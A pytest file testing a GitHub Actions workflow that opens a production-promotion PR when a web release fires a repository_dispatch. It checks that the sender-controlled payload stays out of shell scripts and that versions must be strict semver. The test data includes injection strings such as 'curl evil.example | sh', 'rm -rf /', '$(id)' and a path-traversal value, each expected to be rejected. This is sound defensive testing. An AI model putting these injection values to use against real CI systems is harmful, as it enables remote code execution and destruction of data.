"""Promote Prod must open its own PR when web publishes a release.

`#1585`. Prod ran `kubelab-web:1.1.1` from 2026-06-15 to 2026-09-03 — eleven
releases behind — because the only way into the gate was a human remembering to
`workflow_dispatch` this workflow, and that remembering failed eleven consecutive
times. ADR-046's gate is not the defect and is unchanged here: kubelab still
opens a PR, a human still merges it, Argo CD still syncs afterwards. What this
adds is the *entering*.

Two properties make the tests below execute the shipped script rather than read
it. `repository_dispatch` fires only from the default-branch copy of a workflow,
so the branch introducing this cannot exercise it in CI at all — the same bind
`test_pr_agent_workflow.py` documents for `workflow_run`. And the value that
arrives is `client_payload`, arbitrary JSON from the sender, which ends up as a
command-line argument and a registry lookup. A validation step that is only read
is a validation step nobody ran.
"""

from __future__ import annotations

import os
import pathlib
import shutil
import subprocess
import sys

import pytest
import yaml

REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
PROMOTE = REPO_ROOT / ".github/workflows/promote-prod.yml"

# The event type web fires, pinned as a literal on purpose.
#
# It is a two-repo agreement — `mlorentedev/web`'s release.yml sends it
# (`web#295`) and this workflow listens for it — and a test here cannot read the
# sending half. Rename either side and nothing errors: web's `curl` still gets a
# 204, the event reaches a repository that has no workflow listening for that
# type, and GitHub drops it without a trace. That is precisely the silent-drift
# failure class this repo catalogues, so the string is anchored on this side and
# `web#295`'s acceptance evidence — a real release opening its PR unattended —
# is what closes the loop on the other.
EVENT_TYPE = "web-release-published"

# The app the event type means. Deliberately NOT read from client_payload: the
# fewer sender-controlled fields decide what runs, the smaller the surface.
DISPATCH_APP = "web"


def _load() -> dict:
    return yaml.safe_load(PROMOTE.read_text(encoding="utf-8"))


def _triggers() -> dict:
    # PyYAML parses a bare `on:` key as the boolean True (the Norway problem's
    # cousin). Accept either spelling so the test does not depend on quoting.
    doc = _load()
    return doc.get("on") or doc.get(True) or {}


def _steps() -> list[dict]:
    return _load()["jobs"]["promote"]["steps"]


def _step(step_id: str) -> dict:
    """Found by `id:`, which downstream steps already depend on — a rename must
    break loudly here rather than silently skip the assertions."""
    return next(s for s in _steps() if s.get("id") == step_id)


# --- the trigger ------------------------------------------------------------


def test_the_workflow_listens_for_the_event_a_web_release_fires() -> None:
    types = _triggers().get("repository_dispatch", {}).get("types", [])
    assert EVENT_TYPE in types, (
        f"promote-prod.yml listens for {types!r}, but web fires {EVENT_TYPE!r}. "
        f"A dispatch whose type no workflow declares is accepted by GitHub with a "
        f"204 and then dropped — the sender sees success and prod never promotes, "
        f"which is the failure this change exists to end, reintroduced."
    )


def test_the_manual_dispatch_path_survives_unchanged() -> None:
    """`#1585` AC2. The automated path is an addition, not a replacement: a
    re-promote, a rollback, and promoting `api` all still need a human to be
    able to start this by hand."""
    inputs = _triggers().get("workflow_dispatch", {}).get("inputs", {})
    assert set(inputs) == {"app", "version"}, f"the manual inputs changed: {sorted(inputs)}"
    assert inputs["app"]["options"] == ["web", "api"]
    assert inputs["app"]["required"] is True
    assert inputs["version"]["required"] is True


def test_a_dispatch_serialises_against_a_manual_promote_of_the_same_app() -> None:
    """The concurrency group must resolve to the same string on both paths.

    `promote-prod-${{ inputs.app }}` alone degrades to `promote-prod-` on a
    repository_dispatch, where the `inputs` context is empty — so an automated
    promote and a human promoting `web` at the same moment would land in two
    different groups and race each other's `git push` on the same branch name.
    """
    group = str(_load()["concurrency"]["group"])
    assert f"|| '{DISPATCH_APP}'" in group, (
        f"the concurrency group is {group!r}; on a repository_dispatch `inputs` is "
        f"empty, so it must fall back to {DISPATCH_APP!r} rather than to nothing"
    )
    assert _load()["concurrency"]["cancel-in-progress"] is False, "queue, never cancel"


# --- the payload is not trusted --------------------------------------------


def test_no_step_interpolates_the_payload_into_its_shell() -> None:
    """`client_payload` is attacker-reachable if the dispatch token ever leaks,
    and `${{ }}` inside `run:` is textual substitution *before* bash sees the
    script — a version of `x"; curl evil | sh; #` would execute. Every use goes
    through `env:`, where the value is data."""
    for step in _steps():
        assert "client_payload" not in str(step.get("run", "")), (
            f"step {step.get('name')!r} interpolates client_payload directly into "
            f"its script. Pass it through `env:` instead."
        )


def test_the_app_is_never_taken_from_the_payload() -> None:
    """The event type already says which app it is. Reading `client_payload.app`
    would let the sender pick which application gets promoted to production —
    a strictly larger surface for no gain."""
    assert "client_payload.app" not in PROMOTE.read_text(encoding="utf-8"), (
        "the app is read from the payload; derive it from the event type instead"
    )


def test_the_promote_and_pr_steps_consume_the_resolved_values() -> None:
    """Both downstream steps must read the *validated* outputs, not the raw
    inputs. Leaving one on `inputs.version` would make it empty on every
    automated run — and `git add`/`git diff --staged` would then report nothing
    to promote and exit 0, green."""
    for step_id in ("promote", "open-pr"):
        env = str(_step(step_id).get("env", {}))
        assert "steps.target.outputs.app" in env, f"{step_id} does not read the resolved app"
        assert "steps.target.outputs.version" in env, f"{step_id} does not read the resolved version"
        assert "inputs." not in env, f"{step_id} still reads a raw input; it is empty on a dispatch"


# --- the validation step, executed ------------------------------------------

_needs_bash = pytest.mark.skipif(shutil.which("bash") is None, reason="the step is a bash script")


def _resolve(tmp_path: pathlib.Path, **env_overrides: str) -> tuple[int, dict[str, str], str]:
    """Run the resolve step exactly as the job would.

    Returns its exit code, whatever it wrote to `GITHUB_OUTPUT`, and its combined
    log. Every variable the step declares is seeded empty first, because that is
    what GitHub renders for a context key the event does not carry — an
    unset-variable failure here would be an artefact of the harness, not of the
    script.
    """
    output = tmp_path / "github_output"
    output.touch()
    step = _step("target")
    env = {
        "PATH": os.pathsep.join([str(pathlib.Path(sys.executable).parent), os.environ["PATH"]]),
        "GITHUB_OUTPUT": str(output),
        **{key: "" for key in (step.get("env") or {})},
        **env_overrides,
    }
    proc = subprocess.run(  # noqa: S603
        ["bash", "-c", step["run"]],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        timeout=60,
    )
    parsed = dict(
        line.split("=", 1) for line in output.read_text().splitlines() if "=" in line
    )
    return proc.returncode, parsed, proc.stdout + proc.stderr


@_needs_bash
def test_a_release_dispatch_resolves_web_and_its_version(tmp_path: pathlib.Path) -> None:
    """The path that closes #1585: web publishes 1.12.0, prod promotes 1.12.0."""
    code, out, _ = _resolve(tmp_path, EVENT="repository_dispatch", PAYLOAD_VERSION="1.12.0")
    assert code == 0
    assert out == {"app": "web", "version": "1.12.0"}


@_needs_bash
def test_a_manual_dispatch_still_resolves_its_own_inputs(tmp_path: pathlib.Path) -> None:
    """And `api` must still be promotable by hand — the app is only pinned to
    web on the dispatch path, which is what the event type means."""
    code, out, _ = _resolve(
        tmp_path, EVENT="workflow_dispatch", INPUT_APP="api", INPUT_VERSION="1.1.1"
    )
    assert code == 0
    assert out == {"app": "api", "version": "1.1.1"}


@_needs_bash
def test_a_dispatch_carrying_no_version_fails_loudly(tmp_path: pathlib.Path) -> None:
    """`#1585` AC3. An absent `client_payload.version` renders as the empty
    string. Reaching the toolkit with it would promote nothing and, worse, the
    PR step's `git diff --staged --quiet` would then find no change and exit 0
    — a green run that promoted nothing, which is exactly the shape of the
    failure being fixed."""
    code, out, log = _resolve(tmp_path, EVENT="repository_dispatch", PAYLOAD_VERSION="")
    assert code != 0, "an empty version was accepted"
    assert out == {}, "a rejected run must publish no outputs"
    assert "::error::" in log, "the failure must name itself in the log"


@_needs_bash
@pytest.mark.parametrize(
    "version",
    [
        "v1.12.0",  # the tag GitHub carries; the registry tag has no `v`
        "latest",  # a mutable alias — prod pins immutable tags only (ADR-046)
        "sha-f98a705",  # a staging tag; prod ships released semver
        "1.12",  # not a full semver triple
        "1.12.0 && curl evil.example | sh",
        "1.12.0; rm -rf /",
        "$(id)",
        "../../etc/passwd",
    ],
)
def test_a_version_that_is_not_an_immutable_semver_tag_is_refused(
    tmp_path: pathlib.Path, version: str
) -> None:
    code, out, log = _resolve(tmp_path, EVENT="repository_dispatch", PAYLOAD_VERSION=version)
    assert code != 0, f"{version!r} was accepted as a version to promote to production"
    assert out == {}
    assert "::error::" in log


@_needs_bash
def test_a_newline_cannot_smuggle_a_second_line_past_the_pattern(
    tmp_path: pathlib.Path,
) -> None:
    """JSON strings carry newlines, and a line-oriented check would pass this.

    `printf '%s' "$v" | grep -qE '^[0-9.]+$'` matches the FIRST line and returns
    0, so `1.12.0\\nrm -rf /` would validate. Bash's `=~` anchors against the
    whole string, which is why the step uses it — asserted here rather than left
    to the reader to notice.
    """
    code, out, _ = _resolve(
        tmp_path, EVENT="repository_dispatch", PAYLOAD_VERSION="1.12.0\nrm -rf /"
    )
    assert code != 0, "a multi-line version passed validation"
    assert out == {}


@_needs_bash
def test_an_unknown_app_on_the_manual_path_is_refused(tmp_path: pathlib.Path) -> None:
    """`workflow_dispatch` renders a choice box, but the API accepts arbitrary
    strings for it — the UI is not the validation."""
    code, out, log = _resolve(
        tmp_path, EVENT="workflow_dispatch", INPUT_APP="errors", INPUT_VERSION="1.1.1"
    )
    assert code != 0
    assert out == {}
    assert "::error::" in log
